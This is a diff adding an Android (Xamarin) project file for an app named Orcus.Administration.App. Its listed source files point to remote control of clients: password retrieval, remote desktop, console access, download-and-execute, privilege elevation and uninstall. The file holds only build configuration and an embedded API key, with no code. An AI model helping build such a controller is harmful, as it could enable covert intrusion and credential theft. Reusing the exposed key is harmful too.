@@ -1,0 +1,205 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project DefaultTargets="Build" ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectTypeGuids>{EFBA0AD7-5A72-4C68-AF49-83D382785DCF};{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}</ProjectTypeGuids>
+    <ProjectGuid>{7BB0201E-4D9A-4F80-A817-F67FEBA5FF3C}</ProjectGuid>
+    <OutputType>Library</OutputType>
+    <RootNamespace>Orcus.Administration.App</RootNamespace>
+    <AndroidApplication>True</AndroidApplication>
+    <AndroidResgenFile>Resources\Resource.designer.cs</AndroidResgenFile>
+    <AndroidResgenClass>Resource</AndroidResgenClass>
+    <AndroidManifest>Properties\AndroidManifest.xml</AndroidManifest>
+    <MonoAndroidResourcePrefix>Resources</MonoAndroidResourcePrefix>
+    <MonoAndroidAssetsPrefix>Assets</MonoAndroidAssetsPrefix>
+    <AndroidUseLatestPlatformSdk>False</AndroidUseLatestPlatformSdk>
+    <AssemblyName>Orcus.Administration.App</AssemblyName>
+    <TargetFrameworkVersion>v6.0</TargetFrameworkVersion>
+    <XamarinInsightsApiKey>532011184febacdaf0520846ecb23366dd895d15</XamarinInsightsApiKey>
+    <NuGetPackageImportStamp>
+    </NuGetPackageImportStamp>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug</OutputPath>
+    <DefineConstants>DEBUG;</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <ConsolePause>false</ConsolePause>
+    <AndroidLinkMode>None</AndroidLinkMode>
+    <RunCodeAnalysis>false</RunCodeAnalysis>
+    <LangVersion>6</LangVersion>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release</OutputPath>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <ConsolePause>false</ConsolePause>
+    <AndroidUseSharedRuntime>false</AndroidUseSharedRuntime>
+    <RunCodeAnalysis>false</RunCodeAnalysis>
+    <LangVersion>6</LangVersion>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="System" />
+    <Reference Include="System.Xml" />
+    <Reference Include="System.Core" />
+    <Reference Include="Mono.Android" />
+    <Reference Include="Mono.Android.Export" />
+    <Reference Include="Orcus.Shared">
+      <HintPath>..\..\Orcus.Shared\bin\Release\Orcus.Shared.dll</HintPath>
+    </Reference>
+    <Reference Include="android-iconics">
+      <HintPath>..\packages\Mikepenz.Android.Iconics.Xamarin.Binding.2.5.1\lib\MonoAndroid\android-iconics.dll</HintPath>
+    </Reference>
+    <Reference Include="material-drawer">
+      <HintPath>..\packages\Mikepenz.MaterialDrawer.Xamarin.Android.4.5.8\lib\MonoAndroid\material-drawer.dll</HintPath>
+    </Reference>
+    <Reference Include="materialize-library">
+      <HintPath>..\packages\Mikepenz.MaterialDrawer.Xamarin.Android.4.5.8\lib\MonoAndroid\materialize-library.dll</HintPath>
+    </Reference>
+    <Reference Include="Plugin.Settings, Version=2.5.0.0, Culture=neutral, PublicKeyToken=null">
+      <HintPath>..\packages\Xam.Plugins.Settings.2.5.0-beta8\lib\MonoAndroid10\Plugin.Settings.dll</HintPath>
+    </Reference>
+    <Reference Include="Plugin.Settings.Abstractions, Version=2.5.0.0, Culture=neutral, PublicKeyToken=null">
+      <HintPath>..\packages\Xam.Plugins.Settings.2.5.0-beta8\lib\MonoAndroid10\Plugin.Settings.Abstractions.dll</HintPath>
+    </Reference>
+    <Reference Include="Xamarin.Android.Support.Animated.Vector.Drawable, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null">
+      <HintPath>..\packages\Xamarin.Android.Support.Animated.Vector.Drawable.23.4.0.1\lib\MonoAndroid403\Xamarin.Android.Support.Animated.Vector.Drawable.dll</HintPath>
+    </Reference>
+    <Reference Include="Xamarin.Android.Support.v4, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null">
+      <HintPath>..\packages\Xamarin.Android.Support.v4.23.4.0.1\lib\MonoAndroid403\Xamarin.Android.Support.v4.dll</HintPath>
+    </Reference>
+    <Reference Include="Xamarin.Android.Support.v7.AppCompat, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null">
+      <HintPath>..\packages\Xamarin.Android.Support.v7.AppCompat.23.4.0.1\lib\MonoAndroid403\Xamarin.Android.Support.v7.AppCompat.dll</HintPath>
+    </Reference>
+    <Reference Include="Xamarin.Android.Support.v7.RecyclerView, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null">
+      <HintPath>..\packages\Xamarin.Android.Support.v7.RecyclerView.23.4.0.1\lib\MonoAndroid403\Xamarin.Android.Support.v7.RecyclerView.dll</HintPath>
+    </Reference>
+    <Reference Include="Xamarin.Android.Support.Vector.Drawable, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null">
+      <HintPath>..\packages\Xamarin.Android.Support.Vector.Drawable.23.4.0.1\lib\MonoAndroid403\Xamarin.Android.Support.Vector.Drawable.dll</HintPath>
+    </Reference>
+    <Reference Include="Xamarin.Insights, Version=1.12.0.0, Culture=neutral, PublicKeyToken=null">
+      <HintPath>..\packages\Xamarin.Insights.1.12.3\lib\MonoAndroid10\Xamarin.Insights.dll</HintPath>
+    </Reference>
+    <Reference Include="Orcus.Plugins">
+      <HintPath>..\..\Orcus.Plugins\bin\Release\Orcus.Plugins.dll</HintPath>
+    </Reference>
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="Helpers\Settings.cs" />
+    <Compile Include="Resources\Resource.designer.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Activities\ClientsActivity.cs" />
+    <Compile Include="Activities\MainActivity.cs" />
+    <Compile Include="Activities\ConnectActivity.cs" />
+    <Compile Include="Core\Settings.cs" />
+    <Compile Include="Core\ConnectionManager.cs" />
+    <Compile Include="Core\ClientController.cs" />
+    <Compile Include="Core\Sender.cs" />
+    <Compile Include="Core\CommandManagement\Command.cs" />
+    <Compile Include="Core\CommandManagement\Commander.cs" />
+    <Compile Include="Core\CommandManagement\CommandToken.cs" />
+    <Compile Include="Core\CommandManagement\ConnectionInfo.cs" />
+    <Compile Include="Core\Commands\FunCommand.cs" />
+    <Compile Include="Fragments\ClientListFragment.cs" />
+    <Compile Include="Fragments\FunFragment.cs" />
+    <Compile Include="Fragments\HomeFragment.cs" />
+    <Compile Include="Fragments\TaskManagerFragment.cs" />
+    <Compile Include="Core\Commands\TaskManagerCommand.cs" />
+    <Compile Include="CellStyles\ProcessListAdapter.cs" />
+    <Compile Include="Core\Commands\PasswordCommand.cs" />
+    <Compile Include="Fragments\PasswordFragment.cs" />
+    <Compile Include="CellStyles\PasswordsListAdapter.cs" />
+    <Compile Include="Core\Commands\ClientActionCommand.cs" />
+    <Compile Include="Core\Commands\InternetCommand.cs" />
+    <Compile Include="Core\Commands\ConsoleCommand.cs" />
+    <Compile Include="Fragments\ConsoleFragment.cs" />
+    <Compile Include="CellStyles\ClientListItem_Adapter.cs" />
+    <Compile Include="Core\Data\SectionClientInfo.cs" />
+    <Compile Include="Fragments\RemoteDesktopFragment.cs" />
+    <Compile Include="Controls\ScaleImageView.cs" />
+    <Compile Include="Core\Commands\RemoteDesktopCommand.cs" />
+    <Compile Include="Core\CommandManagement\StaticCommander.cs" />
+    <Compile Include="Fragments\DownloadAndExecuteFragment.cs" />
+    <Compile Include="..\..\Orcus.StaticCommands\Client\KillCommand.cs">
+      <Link>Core\StaticCommands\KillCommand.cs</Link>
+    </Compile>
+    <Compile Include="..\..\Orcus.StaticCommands\Client\MakeAdminCommand.cs">
+      <Link>Core\StaticCommands\MakeAdminCommand.cs</Link>
+    </Compile>
+    <Compile Include="..\..\Orcus.StaticCommands\Client\UninstallCommand.cs">
+      <Link>Core\StaticCommands\UninstallCommand.cs</Link>
+    </Compile>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\AboutResources.txt" />
+    <None Include="Properties\AndroidManifest.xml" />
+    <None Include="Assets\AboutAssets.txt" />
+    <None Include="packages.config" />
+    <None Include="app.config" />
+  </ItemGroup>
+  <ItemGroup>
+    <AndroidResource Include="Resources\values\Strings.xml" />
+    <AndroidResource Include="Resources\mipmap-hdpi\Icon.png" />
+    <AndroidResource Include="Resources\mipmap-mdpi\Icon.png" />
+    <AndroidResource Include="Resources\mipmap-xhdpi\Icon.png" />
+    <AndroidResource Include="Resources\mipmap-xxhdpi\Icon.png" />
+    <AndroidResource Include="Resources\layout\ConnectLayout.axml" />
+    <AndroidResource Include="Resources\layout\toolbar.axml" />
+    <AndroidResource Include="Resources\values\colors.xml" />
+    <AndroidResource Include="Resources\menu\main.xml" />
+    <AndroidResource Include="Resources\layout\MainDrawerLayout.axml" />
+    <AndroidResource Include="Resources\layout\FunFragment.axml" />
+    <AndroidResource Include="Resources\layout\HomeFragment.axml" />
+    <AndroidResource Include="Resources\drawable\header.jpg" />
+    <AndroidResource Include="Resources\values\styles.xml" />
+    <AndroidResource Include="Resources\menu\RefreshMenu.xml" />
+    <AndroidResource Include="Resources\drawable-hdpi\ic_action.png" />
+    <AndroidResource Include="Resources\drawable-ldpi\ic_action.png" />
+    <AndroidResource Include="Resources\drawable-mdpi\ic_action.png" />
+    <AndroidResource Include="Resources\drawable-xhdpi\ic_action.png" />
+    <AndroidResource Include="Resources\drawable-xxhdpi\ic_action.png" />
+    <AndroidResource Include="Resources\layout\ProcessRow.xml" />
+    <AndroidResource Include="Resources\layout\PasswordRow.xml" />
+    <AndroidResource Include="Resources\drawable-hdpi\application.png" />
+    <AndroidResource Include="Resources\drawable-mdpi\application.png" />
+    <AndroidResource Include="Resources\drawable-xhdpi\application.png" />
+    <AndroidResource Include="Resources\drawable-xxhdpi\application.png" />
+    <AndroidResource Include="Resources\layout\DownloadAndExecuteFragment.axml" />
+    <AndroidResource Include="Resources\menu\SwitchMenu.xml" />
+    <AndroidResource Include="Resources\layout\switch_layout.xml" />
+    <AndroidResource Include="Resources\layout\ConsoleFragment.axml" />
+    <AndroidResource Include="Resources\layout\ClientListSectionItem.axml" />
+    <AndroidResource Include="Resources\layout\RemoteDesktopLayout.axml" />
+    <AndroidResource Include="Resources\menu\TakeImageMenu.axml" />
+    <AndroidResource Include="Resources\drawable-hdpi\ic_menu_share_holo_dark.png" />
+    <AndroidResource Include="Resources\drawable-mdpi\ic_menu_share_holo_dark.png" />
+    <AndroidResource Include="Resources\drawable-xhdpi\ic_menu_share_holo_dark.png" />
+    <AndroidResource Include="Resources\drawable-xxhdpi\ic_menu_share_holo_dark.png" />
+  </ItemGroup>
+  <ItemGroup />
+  <ItemGroup>
+    <AndroidAsset Include="Assets\fonts\octicons-v3.2.0.ttf" />
+    <AndroidAsset Include="Assets\fonts\meteocons.ttf" />
+    <AndroidAsset Include="Assets\fonts\materialdesignicons-v1.3.41.ttf" />
+    <AndroidAsset Include="Assets\fonts\google-material-font-v2.1.0.1.ttf" />
+    <AndroidAsset Include="Assets\fonts\fontawesome-webfont-v4.5.0.1.ttf" />
+  </ItemGroup>
+  <Import Project="$(MSBuildExtensionsPath)\Xamarin\Android\Xamarin.Android.CSharp.targets" />
+  <Import Project="..\packages\Xamarin.Android.Support.Vector.Drawable.23.4.0.1\build\Xamarin.Android.Support.Vector.Drawable.targets" Condition="Exists('..\packages\Xamarin.Android.Support.Vector.Drawable.23.4.0.1\build\Xamarin.Android.Support.Vector.Drawable.targets')" />
+  <Target Name="EnsureNuGetPackageBuildImports" BeforeTargets="PrepareForBuild">
+    <PropertyGroup>
+      <ErrorText>This project references NuGet package(s) that are missing on this computer. Use NuGet Package Restore to download them.  For more information, see http://go.microsoft.com/fwlink/?LinkID=322105. The missing file is {0}.</ErrorText>
+    </PropertyGroup>
+    <Error Condition="!Exists('..\packages\Xamarin.Android.Support.Vector.Drawable.23.4.0.1\build\Xamarin.Android.Support.Vector.Drawable.targets')" Text="$([System.String]::Format('$(ErrorText)', '..\packages\Xamarin.Android.Support.Vector.Drawable.23.4.0.1\build\Xamarin.Android.Support.Vector.Drawable.targets'))" />
+    <Error Condition="!Exists('..\packages\Xamarin.Insights.1.12.3\build\MonoAndroid10\Xamarin.Insights.targets')" Text="$([System.String]::Format('$(ErrorText)', '..\packages\Xamarin.Insights.1.12.3\build\MonoAndroid10\Xamarin.Insights.targets'))" />
+  </Target>
+  <Import Project="..\packages\Xamarin.Insights.1.12.3\build\MonoAndroid10\Xamarin.Insights.targets" Condition="Exists('..\packages\Xamarin.Insights.1.12.3\build\MonoAndroid10\Xamarin.Insights.targets')" />
+  <ItemGroup>
+    <Folder Include="Core\StaticCommands\" />
+  </ItemGroup>
+</Project>
